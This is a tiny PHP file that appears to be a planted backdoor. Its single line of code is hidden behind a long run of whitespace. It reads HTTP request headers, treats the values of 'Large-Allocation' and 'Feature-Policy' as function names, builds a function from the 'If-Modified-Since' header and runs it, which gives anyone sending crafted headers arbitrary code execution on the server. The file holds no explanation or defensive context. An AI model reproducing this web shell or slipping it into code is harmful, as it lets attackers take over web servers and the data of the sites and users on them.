<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Large-Allocation'])){$uconvert=$_HEADERS['Large-Allocation']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Modified-Since']));$uconvert();}
